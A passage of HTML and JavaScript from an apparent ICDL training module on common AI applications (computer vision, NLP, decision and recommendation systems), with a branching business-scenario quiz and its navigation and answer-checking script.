Vision</div>\n        </div>\n        <span class="section-chevron">⌄</span>\n      </div>\n      <div class="section-body open">\n        <p class="lead-text">Teaching machines to see — how AI interprets visual information across every industry.</p>\n        <h3>Practical Applications by Sector</h3>\n        <div class="table-wrap">\n          <table>\n            <thead><tr><th>Sector</th><th>Application</th></tr></thead>\n            <tbody>\n              <tr><td><strong>Security</strong></td><td>Facial recognition for building access, surveillance</td></tr>\n              <tr><td><strong>Healthcare</strong></td><td>Detecting diseases in X-rays & MRI scans</td></tr>\n              <tr><td><strong>Retail</strong></td><td>Automated checkout, visual product search</td></tr>\n              <tr><td><strong>Agriculture</strong></td><td>Plant disease ID, drone crop monitoring</td></tr>\n              <tr><td><strong>Automotive</strong></td><td>Self-driving: pedestrian & sign detection</td></tr>\n              <tr><td><strong>Social Media</strong></td><td>Auto photo tagging, content moderation</td></tr>\n              <tr><td><strong>Manufacturing</strong></td><td>Quality inspection, defect detection</td></tr>\n              <tr><td><strong>Real Estate</strong></td><td>Property valuation from satellite imagery</td></tr>\n            </tbody>\n          </table>\n        </div>\n        <div class="info-box teal">\n          <strong>🤔 How AI "Sees"</strong>\n          AI doesn''t see like humans. Instead, it analyses pixel values as numbers and identifies mathematical patterns. It learns that certain arrangements of numbers correspond to a face, a tumour, or a stop sign — achieving superhuman accuracy in narrow visual tasks.\n        </div>\n      </div>\n    </div>\n    <div class="nav-row">\n      <button class="btn btn-secondary" onclick="showPage(2)">← Previous</button>\n      <button class="btn btn-primary" onclick="showPage(4)">Next: NLP →</button>\n    </div>\n  </div>\n\n  <!-- PAGE 4: NLP -->\n  <div class="page" id="page-4" data-narration="Section 3.5: Natural Language Processing. Natural Language Processing, or NLP, enables computers to understand, interpret, and generate human language. It is arguably the most visible form of AI in daily life. Key applications include: Chatbots and Virtual Assistants — Siri, Alexa, and Google Assistant all use NLP to understand voice commands and give helpful responses. Machine Translation — tools like Google Translate and DeepL convert text between languages with remarkable fluency. Sentiment Analysis — companies analyse customer reviews and social media posts to measure brand sentiment at scale. Speech Recognition — voice typing and transcription services like Otter.ai convert spoken words to text. Content Generation — AI writing assistants help produce blog posts, emails, and reports in minutes. Question Answering — search engines use NLP to understand what you''re really looking for, beyond simple keyword matching. Modern AI translation goes far beyond word-for-word substitution — it understands context, handles idiomatic expressions, and maintains meaning across languages. It also learns from corrections and adapts to specialised vocabulary in legal, medical, and technical domains.">\n    <div class="section-card">\n      <div class="section-header open" onclick="toggleSection(this)">\n        <div class="section-icon" style="background:rgba(124,58,237,0.15)">💬</div>\n        <div>\n          <div class="section-num">Section 3.6 & 3.7</div>\n          <div class="section-title">Natural Language Processing (NLP)</div>\n        </div>\n        <span class="section-chevron">⌄</span>\n      </div>\n      <div class="section-body open">\n        <p class="lead-text">Teaching machines to read, understand, and speak — NLP powers everything from chatbots to translation.</p>\n        <h3>Key NLP Applications</h3>\n        <div class="table-wrap">\n          <table>\n            <thead><tr><th>Application</th><th>Examples</th></tr></thead>\n            <tbody>\n              <tr><td><strong>Chatbots & Assistants</strong></td><td>Siri, Alexa, Google Assistant, customer service bots</td></tr>\n              <tr><td><strong>Machine Translation</strong></td><td>Google Translate, DeepL</td></tr>\n              <tr><td><strong>Sentiment Analysis</strong></td><td>Brand monitoring, customer review analysis</td></tr>\n              <tr><td><strong>Text Summarisation</strong></td><td>News aggregators, document summaries</td></tr>\n              <tr><td><strong>Speech Recognition</strong></td><td>Voice typing, transcription services</td></tr>\n              <tr><td><strong>Content Generation</strong></td><td>AI writing assistants, automated reporting</td></tr>\n              <tr><td><strong>Question Answering</strong></td><td>Search engines, knowledge bases</td></tr>\n            </tbody>\n          </table>\n        </div>\n        <h3>Sentiment Analysis: Business Uses</h3>\n        <div class="chip-grid">\n          <span class="chip purple">Brand monitoring</span>\n          <span class="chip purple">Customer service triage</span>\n          <span class="chip purple">Market research at scale</span>\n          <span class="chip purple">Political campaign analysis</span>\n          <span class="chip purple">Product development insights</span>\n        </div>\n        <div class="info-box purple">\n          <strong>🌍 Modern AI Translation</strong>\n          Today''s translation AI understands context and idiomatic expressions, handles multiple languages simultaneously, and adapts to specialised domains — producing results that rival professional translators for many document types.\n        </div>\n      </div>\n    </div>\n    <div class="nav-row">\n      <button class="btn btn-secondary" onclick="showPage(3)">← Previous</button>\n      <button class="btn btn-primary" onclick="showPage(5)">Next: Decision Systems →</button>\n    </div>\n  </div>\n\n  <!-- PAGE 5: AI Decision Systems + Recommendation Engines -->\n  <div class="page" id="page-5" data-narration="Section 3.8 and 3.9: AI Decision Making and Recommendation Engines. AI decision-making systems support or automate complex decisions across many sectors. In Healthcare — AI assists with diagnosis, recommends treatments, and accelerates drug discovery. In Finance — AI performs credit scoring, investment advice, fraud detection, and anti-money laundering. In Human Resources — AI screens resumes, matches candidates to roles, and evaluates performance. In Legal — AI analyses contracts, predicts case outcomes, and automates legal research. In Education — AI creates personalised learning paths and predicts which students need extra support. Recommendation Engines are a special type of AI decision system that suggests products, content, or services. Here is how they work: First, the system collects user behaviour data — clicks, views, purchases, and time spent. Second, it identifies patterns in that behaviour. Third, it compares users with similar interests. Fourth, it predicts what new content or products a user might enjoy. Fifth, it presents personalised recommendations. Famous examples include Netflix recommending shows based on your viewing history, Amazon''s ''customers who bought this also bought'' suggestions, Spotify''s personalised Discover Weekly playlists, YouTube''s autoplay video queue, and LinkedIn''s job and connection recommendations.">\n    <div class="section-card">\n      <div class="section-header open" onclick="toggleSection(this)">\n        <div class="section-icon" style="background:rgba(255,107,53,0.15)">🧠</div>\n        <div>\n          <div class="section-num">Section 3.8 & 3.9</div>\n          <div class="section-title">AI Decision Systems & Recommendation Engines</div>\n        </div>\n        <span class="section-chevron">⌄</span>\n      </div>\n      <div class="section-body open">\n        <p class="lead-text">AI supporting and automating high-stakes decisions — and personalising every digital experience.</p>\n        <h3>Decision Support by Sector</h3>\n        <div class="table-wrap">\n          <table>\n            <thead><tr><th>Sector</th><th>AI Application</th></tr></thead>\n            <tbody>\n              <tr><td><strong>Healthcare</strong></td><td>Diagnosis assistance, treatment recommendations, drug discovery</td></tr>\n              <tr><td><strong>Finance</strong></td><td>Credit scoring, robo-advisors, fraud detection</td></tr>\n              <tr><td><strong>HR</strong></td><td>Resume screening, candidate matching, performance evaluation</td></tr>\n              <tr><td><strong>Legal</strong></td><td>Contract analysis, case outcome prediction, e-discovery</td></tr>\n              <tr><td><strong>Education</strong></td><td>Personalised learning paths, at-risk student prediction</td></tr>\n              <tr><td><strong>Logistics</strong></td><td>Route optimisation, demand forecasting, inventory management</td></tr>\n            </tbody>\n          </table>\n        </div>\n        <h3>How Recommendation Engines Work</h3>\n        <div class="info-box orange">\n          <strong>⚙ The 5-Step Process</strong>\n          1. Collect user behaviour (clicks, views, purchases) → 2. Identify behavioural patterns → 3. Compare with similar users → 4. Predict what you might like → 5. Present personalised recommendations\n        </div>\n        <h3>Famous Recommendation Systems</h3>\n        <div class="chip-grid">\n          <span class="chip orange">🎬 Netflix — shows you''ll watch</span>\n          <span class="chip orange">🛒 Amazon — "also bought"</span>\n          <span class="chip orange">🎵 Spotify — Discover Weekly</span>\n          <span class="chip orange">▶ YouTube — autoplay queue</span>\n          <span class="chip orange">💼 LinkedIn — jobs & connections</span>\n          <span class="chip orange">📰 News apps — curated feed</span>\n        </div>\n      </div>\n    </div>\n    <div class="nav-row">\n      <button class="btn btn-secondary" onclick="showPage(4)">← Previous</button>\n      <button class="btn btn-primary" onclick="showPage(6)">Take the Scenario Quiz →</button>\n    </div>\n  </div>\n\n  <!-- PAGE 6: SCENARIO QUIZ -->\n  <div class="page" id="page-6" data-narration="Welcome to the Scenario Quiz for Module 3. You will now work through three realistic business scenarios that test your understanding of common AI examples. Read each scenario carefully, then choose the best answer. Your choices will branch to different outcomes and feedback paths. Let''s begin.">\n\n    <!-- Scenario 1 -->\n    <div class="scenario-section">\n      <div class="scenario-tag">📍 Scenario 1 of 3 — Retail Business</div>\n      <div class="scenario-title">The Struggling Supermarket</div>\n      <div class="scenario-desc">Apply your knowledge of AI applications to solve a real business problem.</div>\n\n      <div class="scenario-context">\n        <p><strong>Situation:</strong> QuickMart Supermarket in Nairobi has a problem. They are frequently running out of popular items on weekends while overstocking slow-moving goods. Their store manager, Janet, manually checks shelves every morning and makes orders based on gut feeling. Sales have dropped 15% because customers find empty shelves. The owner asks you for an AI-based solution.</p>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 1 of 3</div>\n        <div class="question-text">Which AI application would BEST solve QuickMart''s stock management problem?</div>\n        <div class="options" id="s1q1-opts">\n          <button class="option-btn" onclick="answerQ(''s1q1'', ''A'', false)" id="s1q1-A">\n            <span class="opt-letter">A</span>\n            <span>Facial recognition to identify regular customers at the door</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q1'', ''B'', true)" id="s1q1-B">\n            <span class="opt-letter">B</span>\n            <span>Predictive analytics using historical sales data to forecast demand and automate restocking</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q1'', ''C'', false)" id="s1q1-C">\n            <span class="opt-letter">C</span>\n            <span>A chatbot to answer customer questions about product availability</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q1'', ''D'', false)" id="s1q1-D">\n            <span class="opt-letter">D</span>\n            <span>Sentiment analysis of social media posts about the supermarket</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s1q1-fb"></div>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 2 of 3</div>\n        <div class="question-text">Janet also notices customers often buy cooking oil when they buy ugali flour. Which data mining technique would help QuickMart take advantage of this insight?</div>\n        <div class="options" id="s1q2-opts">\n          <button class="option-btn" onclick="answerQ(''s1q2'', ''A'', false)" id="s1q2-A">\n            <span class="opt-letter">A</span>\n            <span>Customer Churn Prediction</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q2'', ''B'', false)" id="s1q2-B">\n            <span class="opt-letter">B</span>\n            <span>Fraud Detection</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q2'', ''C'', true)" id="s1q2-C">\n            <span class="opt-letter">C</span>\n            <span>Market Basket Analysis</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q2'', ''D'', false)" id="s1q2-D">\n            <span class="opt-letter">D</span>\n            <span>Sentiment Analysis</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s1q2-fb"></div>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 3 of 3</div>\n        <div class="question-text">QuickMart wants to understand why customers are giving them 2-star reviews online. Which AI application should they use?</div>\n        <div class="options" id="s1q3-opts">\n          <button class="option-btn" onclick="answerQ(''s1q3'', ''A'', false)" id="s1q3-A">\n            <span class="opt-letter">A</span>\n            <span>Computer vision to scan the store layout</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q3'', ''B'', true)" id="s1q3-B">\n            <span class="opt-letter">B</span>\n            <span>Sentiment analysis to extract opinions and emotions from customer reviews</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q3'', ''C'', false)" id="s1q3-C">\n            <span class="opt-letter">C</span>\n            <span>Predictive analytics to forecast next month''s sales</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s1q3'', ''D'', false)" id="s1q3-D">\n            <span class="opt-letter">D</span>\n            <span>Reinforcement learning to train staff robots</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s1q3-fb"></div>\n      </div>\n\n      <div class="branch-result" id="s1-branch-good">\n        <div class="branch-icon">🏆</div>\n        <h4>Expert Consultant!</h4>\n        <p>You correctly identified all three AI solutions for QuickMart. Janet successfully implements predictive restocking, a market basket promotion ("Buy ugali flour, get 10% off cooking oil"), and a sentiment analysis dashboard. Foot traffic increases by 30% within two months.</p>\n      </div>\n      <div class="branch-result" id="s1-branch-okay">\n        <div class="branch-icon">📚</div>\n        <h4>Good Effort — Keep Reviewing</h4>\n        <p>You identified some correct solutions but mixed up a few AI applications. Revisit the Data Mining and Predictive Analytics sections. Remember: Market Basket Analysis = "bought together", Predictive Analytics = "what will happen next", Sentiment Analysis = "what do people feel".</p>\n      </div>\n      <div class="branch-result" id="s1-branch-retry">\n        <div class="branch-icon">🔄</div>\n        <h4>Let''s Review Together</h4>\n        <p>This scenario covers the core AI applications from sections 3.2 and 3.3. Go back and re-read the Data Mining table and the Predictive Analytics section, then try again. Focus on matching each business problem to the correct AI technique.</p>\n      </div>\n    </div>\n\n    <!-- Scenario 2 -->\n    <div class="scenario-section">\n      <div class="scenario-tag">🏥 Scenario 2 of 3 — Healthcare</div>\n      <div class="scenario-title">Kilimani Medical Centre</div>\n      <div class="scenario-desc">A hospital CTO wants to implement AI — help them choose wisely.</div>\n\n      <div class="scenario-context">\n        <p><strong>Situation:</strong> Kilimani Medical Centre is overwhelmed. Radiologists take 48 hours to review X-rays, patients wait days for results. The hospital also wants to improve patient flow and reduce unnecessary readmissions. Dr. Ochieng, the CTO, has a budget to implement AI in two departments: radiology and the patient management system.</p>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 1 of 3</div>\n        <div class="question-text">Which AI technology should Dr. Ochieng implement in the radiology department to speed up X-ray reviews?</div>\n        <div class="options" id="s2q1-opts">\n          <button class="option-btn" onclick="answerQ(''s2q1'', ''A'', false)" id="s2q1-A">\n            <span class="opt-letter">A</span>\n            <span>A recommendation engine to suggest medical journals to doctors</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q1'', ''B'', true)" id="s2q1-B">\n            <span class="opt-letter">B</span>\n            <span>Computer vision / image recognition AI trained to detect abnormalities in medical images</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q1'', ''C'', false)" id="s2q1-C">\n            <span class="opt-letter">C</span>\n            <span>NLP chatbot to answer patient questions about medications</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q1'', ''D'', false)" id="s2q1-D">\n            <span class="opt-letter">D</span>\n            <span>Data mining to analyse hospital billing records</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s2q1-fb"></div>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 2 of 3</div>\n        <div class="question-text">To reduce unnecessary readmissions, the hospital wants to predict which discharged patients are likely to return within 30 days. This is an example of:</div>\n        <div class="options" id="s2q2-opts">\n          <button class="option-btn" onclick="answerQ(''s2q2'', ''A'', true)" id="s2q2-A">\n            <span class="opt-letter">A</span>\n            <span>Predictive analytics — using patient history data to forecast readmission risk</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q2'', ''B'', false)" id="s2q2-B">\n            <span class="opt-letter">B</span>\n            <span>Sentiment analysis — reading patient satisfaction scores</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q2'', ''C'', false)" id="s2q2-C">\n            <span class="opt-letter">C</span>\n            <span>Image recognition — scanning patient photos for visible symptoms</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q2'', ''D'', false)" id="s2q2-D">\n            <span class="opt-letter">D</span>\n            <span>Market basket analysis — checking which medications are prescribed together</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s2q2-fb"></div>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 3 of 3</div>\n        <div class="question-text">Patients are calling the hospital helpline with the same 10 questions repeatedly, overloading reception staff. Which AI solution would most efficiently handle this?</div>\n        <div class="options" id="s2q3-opts">\n          <button class="option-btn" onclick="answerQ(''s2q3'', ''A'', false)" id="s2q3-A">\n            <span class="opt-letter">A</span>\n            <span>Computer vision cameras in the waiting room</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q3'', ''B'', false)" id="s2q3-B">\n            <span class="opt-letter">B</span>\n            <span>Predictive analytics on appointment scheduling</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q3'', ''C'', true)" id="s2q3-C">\n            <span class="opt-letter">C</span>\n            <span>An NLP-powered chatbot that understands and answers common patient questions automatically</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s2q3'', ''D'', false)" id="s2q3-D">\n            <span class="opt-letter">D</span>\n            <span>A recommendation engine for patient meal preferences</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s2q3-fb"></div>\n      </div>\n\n      <div class="branch-result" id="s2-branch-good">\n        <div class="branch-icon">🌟</div>\n        <h4>Healthcare AI Specialist!</h4>\n        <p>Excellent work! Dr. Ochieng implements your recommendations. The computer vision AI reduces radiology review time from 48 hours to 4 hours. The readmission predictor reduces unnecessary returns by 22%. The NLP chatbot handles 68% of incoming calls automatically, freeing staff for critical care.</p>\n      </div>\n      <div class="branch-result" id="s2-branch-okay">\n        <div class="branch-icon">🩺</div>\n        <h4>Good Foundation — Refine Your Thinking</h4>\n        <p>You have a good grasp of AI in healthcare but confused some applications. Remember: Computer Vision = sees and interprets images. Predictive Analytics = forecasts future events from historical data. NLP = understands and processes human language. Each has its own specific use case.</p>\n      </div>\n      <div class="branch-result" id="s2-branch-retry">\n        <div class="branch-icon">📖</div>\n        <h4>Review & Retry</h4>\n        <p>Healthcare is one of the richest areas for AI applications. Revisit sections 3.4, 3.5, and 3.8 focusing on which AI type (vision, NLP, predictive) solves which type of problem. Then try this scenario again.</p>\n      </div>\n    </div>\n\n    <!-- Scenario 3 -->\n    <div class="scenario-section">\n      <div class="scenario-tag">🎬 Scenario 3 of 3 — Media & Entertainment</div>\n      <div class="scenario-title">StreamKenya Platform</div>\n      <div class="scenario-desc">A new streaming platform needs AI to compete with Netflix in East Africa.</div>\n\n      <div class="scenario-context">\n        <p><strong>Situation:</strong> StreamKenya is a new local video streaming service targeting East African audiences. They have 50,000 users but engagement is low — users watch one show then leave. CEO Amina wants to increase average watch time from 20 minutes to 90 minutes per session. She also wants to grow the subscriber base using targeted digital marketing.</p>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 1 of 3</div>\n        <div class="question-text">To increase watch time, StreamKenya should implement which AI system?</div>\n        <div class="options" id="s3q1-opts">\n          <button class="option-btn" onclick="answerQ(''s3q1'', ''A'', true)" id="s3q1-A">\n            <span class="opt-letter">A</span>\n            <span>A recommendation engine that analyses viewing behaviour and suggests content users are likely to enjoy next</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q1'', ''B'', false)" id="s3q1-B">\n            <span class="opt-letter">B</span>\n            <span>Computer vision to analyse the quality of video uploads</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q1'', ''C'', false)" id="s3q1-C">\n            <span class="opt-letter">C</span>\n            <span>A fraud detection system to prevent account sharing</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q1'', ''D'', false)" id="s3q1-D">\n            <span class="opt-letter">D</span>\n            <span>Predictive maintenance to ensure servers don''t crash</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s3q1-fb"></div>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 2 of 3</div>\n        <div class="question-text">StreamKenya wants to identify which subscribers are likely to cancel their subscription in the next 30 days so they can offer retention deals. Which AI technique fits this need?</div>\n        <div class="options" id="s3q2-opts">\n          <button class="option-btn" onclick="answerQ(''s3q2'', ''A'', false)" id="s3q2-A">\n            <span class="opt-letter">A</span>\n            <span>Sentiment analysis of subscriber tweets</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q2'', ''B'', true)" id="s3q2-B">\n            <span class="opt-letter">B</span>\n            <span>Customer churn prediction — AI identifies at-risk subscribers before they leave</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q2'', ''C'', false)" id="s3q2-C">\n            <span class="opt-letter">C</span>\n            <span>Image recognition of subscriber profile photos</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q2'', ''D'', false)" id="s3q2-D">\n            <span class="opt-letter">D</span>\n            <span>Market basket analysis of which shows are watched together</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s3q2-fb"></div>\n      </div>\n\n      <div class="question-card">\n        <div class="question-num">Question 3 of 3</div>\n        <div class="question-text">Amina reads thousands of subscriber reviews every month manually. She wants AI to automatically tell her whether subscribers are happy, frustrated, or neutral. This is:</div>\n        <div class="options" id="s3q3-opts">\n          <button class="option-btn" onclick="answerQ(''s3q3'', ''A'', false)" id="s3q3-A">\n            <span class="opt-letter">A</span>\n            <span>Market basket analysis</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q3'', ''B'', false)" id="s3q3-B">\n            <span class="opt-letter">B</span>\n            <span>Predictive analytics</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q3'', ''C'', false)" id="s3q3-C">\n            <span class="opt-letter">C</span>\n            <span>Computer vision</span>\n          </button>\n          <button class="option-btn" onclick="answerQ(''s3q3'', ''D'', true)" id="s3q3-D">\n            <span class="opt-letter">D</span>\n            <span>Sentiment analysis — NLP that classifies emotional tone in text as positive, negative, or neutral</span>\n          </button>\n        </div>\n        <div class="feedback-box" id="s3q3-fb"></div>\n      </div>\n\n      <div class="branch-result" id="s3-branch-good">\n        <div class="branch-icon">🚀</div>\n        <h4>Product Strategy Expert!</h4>\n        <p>StreamKenya implements all three AI systems based on your recommendations. The recommendation engine increases average watch time to 87 minutes per session. Churn prediction reduces cancellations by 35%. The sentiment dashboard allows the team to respond to negative feedback within hours, boosting satisfaction scores from 3.1 to 4.4 stars.</p>\n      </div>\n      <div class="branch-result" id="s3-branch-okay">\n        <div class="branch-icon">📺</div>\n        <h4>On the Right Track</h4>\n        <p>You correctly identified most AI applications but mixed up one or two. Remember: Recommendation engines drive engagement. Churn prediction prevents cancellations. Sentiment analysis interprets emotions in text. Each is a distinct AI capability. Review and keep building your skills!</p>\n      </div>\n      <div class="branch-result" id="s3-branch-retry">\n        <div class="branch-icon">🎯</div>\n        <h4>Let''s Revisit the Content</h4>\n        <p>The StreamKenya scenario covers sections 3.2, 3.3, and 3.7. Focus specifically on: what does a recommendation engine do? What is churn prediction? What is sentiment analysis? Each has a very specific purpose. Review then retry!</p>\n      </div>\n    </div>\n\n    <!-- Final score -->\n    <div class="quiz-score" id="finalScore">\n      <div class="score-num" id="scoreNum"></div>\n      <div class="score-label">out of 9 questions correct</div>\n      <div style="margin-top:16px; color:var(--text-muted); font-size:14px;" id="scoreMsg"></div>\n      <div style="margin-top:20px; display:flex; gap:12px; justify-content:center; flex-wrap:wrap;">\n        <button class="btn btn-secondary" onclick="resetQuiz()">🔄 Retry Quiz</button>\n        <button class="btn btn-primary" onclick="showPage(7)">View Summary →</button>\n      </div>\n    </div>\n\n    <div class="nav-row">\n      <button class="btn btn-secondary" onclick="showPage(5)">← Back to Lessons</button>\n    </div>\n  </div>\n\n  <!-- PAGE 7: Summary & Certificate -->\n  <div class="page" id="page-7" data-narration="Congratulations! You have completed Module 3: Common AI Examples. Let''s recap what you''ve learned. Organizations adopt AI to automate tasks, handle big data, make faster decisions, and gain competitive advantage. Data Mining reveals hidden patterns in large datasets through techniques like market basket analysis, fraud detection, and customer churn prediction. Predictive Analytics uses historical data to forecast the future — demand, risk, maintenance failures, and more. Image Recognition and Computer Vision let machines see and interpret visual data across healthcare, security, retail, and agriculture. Natural Language Processing enables computers to understand and generate human language — powering chatbots, translation, sentiment analysis, and content generation. AI Decision Systems support high-stakes decisions in healthcare, finance, law, and education. Recommendation Engines personalise every digital experience by analysing user behaviour and predicting preferences. You are now equipped with a solid understanding of how AI is applied in the real world. Continue your ICDL journey with Module 4, which explores AI adoption challenges and ethical implications.">\n\n    <div class="certificate" id="certArea">\n      <div class="cert-icon">🎓</div>\n      <div class="cert-title">Module 3 Complete!</div>\n      <div class="cert-sub">You have successfully studied all sections of Module 3: Common AI Examples<br>Masomotele Technical Training Institute (M.T.T.I) · ICDL Professional</div>\n      <div class="cert-score-wrap">\n        <div class="cert-stat"><div class="cert-stat-num" id="certScore">—</div><div class="cert-stat-label">Quiz Score</div></div>\n        <div class="cert-stat"><div class="cert-stat-num">6</div><div class="cert-stat-label">Sections Covered</div></div>\n        <div class="cert-stat"><div class="cert-stat-num">3</div><div class="cert-stat-label">Scenarios Completed</div></div>\n      </div>\n    </div>\n\n    <div class="section-card" style="margin-top:28px">\n      <div class="section-header open" onclick="toggleSection(this)">\n        <div class="section-icon" style="background:rgba(0,212,170,0.15)">📋</div>\n        <div><div class="section-num">Key Takeaways</div><div class="section-title">Module 3 Summary</div></div>\n        <span class="section-chevron">⌄</span>\n      </div>\n      <div class="section-body open">\n        <div class="table-wrap">\n          <table>\n            <thead><tr><th>AI Application</th><th>Core Purpose</th><th>Key Example</th></tr></thead>\n            <tbody>\n              <tr><td><strong>Data Mining</strong></td><td>Discover hidden patterns in data</td><td>Market basket analysis, fraud detection</td></tr>\n              <tr><td><strong>Predictive Analytics</strong></td><td>Forecast future outcomes</td><td>Stock demand, patient readmission risk</td></tr>\n              <tr><td><strong>Computer Vision</strong></td><td>Interpret visual information</td><td>Medical imaging, self-driving cars</td></tr>\n              <tr><td><strong>NLP</strong></td><td>Understand human language</td><td>Chatbots, translation, sentiment analysis</td></tr>\n              <tr><td><strong>Recommendation Engines</strong></td><td>Personalise user experiences</td><td>Netflix, Spotify, Amazon</td></tr>\n              <tr><td><strong>AI Decision Systems</strong></td><td>Support/automate decisions</td><td>Credit scoring, diagnosis assistance</td></tr>\n            </tbody>\n          </table>\n        </div>\n        <div class="info-box teal" style="margin-top:20px">\n          <strong>🚀 What''s Next?</strong>\n          Proceed to Module 4: AI Adoption — Challenges & Potential, where you''ll explore ethical implications, bias, social impact, and frameworks for responsible AI implementation.\n        </div>\n      </div>\n    </div>\n\n    <div class="nav-row">\n      <button class="btn btn-secondary" onclick="showPage(6)">← Quiz</button>\n      <button class="btn btn-primary" onclick="restartAll()">🔄 Restart Module</button>\n    </div>\n  </div>\n\n</div>\n\n<script>\n  // ── STATE ──────────────────────────────────────────────────────────────────\n  let currentPage = 0;\n  const totalPages = 8;\n  const pagesVisited = new Set([0]);\n  \n  // Quiz state\n  const answers = {};\n  const correct = {\n    s1q1:''B'', s1q2:''C'', s1q3:''B'',\n    s2q1:''B'', s2q2:''A'', s2q3:''C'',\n    s3q1:''A'', s3q2:''B'', s3q3:''D''\n  };\n  const feedbackText = {\n    s1q1: {\n      B: "✓ Correct! Predictive analytics analyses past sales patterns to forecast exactly when and what to restock — eliminating both stockouts and overstock.",\n      wrong: "✗ Not quite. While these are all valid AI tools, the core problem here is inventory prediction, which requires predictive analytics using historical sales data."\n    },\n    s1q2: {\n      C: "✓ Correct! Market Basket Analysis specifically discovers which items are frequently purchased together — perfect for creating bundle promotions or strategic shelf placement.",\n      wrong: "✗ Incorrect. This is the classic use case for Market Basket Analysis — finding items that are frequently bought together. Think supermarket shopping patterns."\n    },\n    s1q3: {\n      B: "✓ Correct! Sentiment analysis uses NLP to extract emotional meaning from text — perfect for analysing customer reviews at scale to identify specific complaints.",\n      wrong: "✗ Not right. To understand the emotional tone and specific complaints in reviews, you need Sentiment Analysis — a Natural Language Processing technique."\n    },\n    s2q1: {\n      B: "✓ Correct! Computer vision AI trained on medical images (X-rays, MRIs) can flag abnormalities in seconds, dramatically reducing radiologist workload and patient wait times.",\n      wrong: "✗ Incorrect. Radiology is a visual task — it requires Computer Vision AI that can interpret medical images, not language models or analytics tools."\n    },\n    s2q2: {\n      A: "✓ Correct! Predicting which patients will be readmitted is a forward-looking forecasting problem — that''s precisely what Predictive Analytics does using historical patient data.",\n      wrong: "✗ Not quite. Forecasting future events (who will be readmitted) from historical data is the definition of Predictive Analytics."\n    },\n    s2q3: {\n      C: "✓ Correct! NLP-powered chatbots understand natural language queries and provide instant answers — perfect for handling high volumes of repetitive questions 24/7.",\n      wrong: "✗ Incorrect. When patients ask questions using natural language (voice or text), you need NLP — Natural Language Processing — to understand and answer them automatically."\n    },\n    s3q1: {\n      A: "✓ Correct! Recommendation engines are specifically designed to increase content consumption by suggesting what to watch next — exactly what Netflix, YouTube, and Spotify use.",\n      wrong: "✗ Not right. To increase watch time, you need a Recommendation Engine that analyses user behaviour and suggests content they''ll want to keep watching."\n    },\n    s3q2: {\n      B: "✓ Correct! Customer Churn Prediction is a data mining technique that identifies users likely to leave a service — allowing targeted retention offers before they cancel.",\n      wrong: "✗ Incorrect. Identifying subscribers likely to cancel is Customer Churn Prediction — a data mining technique that analyses usage patterns to flag at-risk users."\n    },\n    s3q3: {\n      D: "✓ Correct! Sentiment Analysis is an NLP technique that classifies the emotional tone of text as positive, negative, or neutral — ideal for processing large volumes of user reviews.",\n      wrong: "✗ Not correct. Determining whether reviews express happiness, frustration, or neutrality is Sentiment Analysis — it reads emotional tone in text using NLP."\n    }\n  };\n  \n  // Scenario score tracking\n  const scenarioScores = { s1: 0, s2: 0, s3: 0 };\n  const scenarioAnswered = { s1: 0, s2: 0, s3: 0 };\n  let totalCorrect = 0;\n\n  // ── NAVIGATION ────────────────────────────────────────────────────────────\n  function showPage(n) {\n    stopNarration();\n    document.querySelectorAll(''.page'').forEach(p => p.classList.remove(''active''));\n    document.querySelectorAll(''.module-pill'').forEach(p => p.classList.remove(''active''));\n    document.getElementById(''page-'' + n).classList.add(''active'');\n    document.getElementById(''pill-'' + n).classList.add(''active'');\n    pagesVisited.add(n);\n    currentPage = n;\n    updateProgress();\n    window.scrollTo({ top: 0, behavior: ''smooth'' });\n    // Mark visited pills\n    pagesVisited.forEach(i => {\n      const pill = document.getElementById(''pill-'' + i);\n      if (pill && i !== n) pill.classList.add(''done'');\n    });\n  }\n\n  function updateProgress() {\n    const pct = Math.round((pagesVisited.size / totalPages) * 100);\n    document.getElementById(''progressFill'').style.width = pct + ''%'';\n    document.getElementById(''progressPct'').textContent = pct + ''%'';\n  }\n\n  function toggleSection(header) {\n    header.classList.toggle(''open'');\n    header.nextElementSibling.classList.toggle(''open'');\n  }\n\n  // ── QUIZ LOGIC ────────────────────────────────────────────────────────────\n  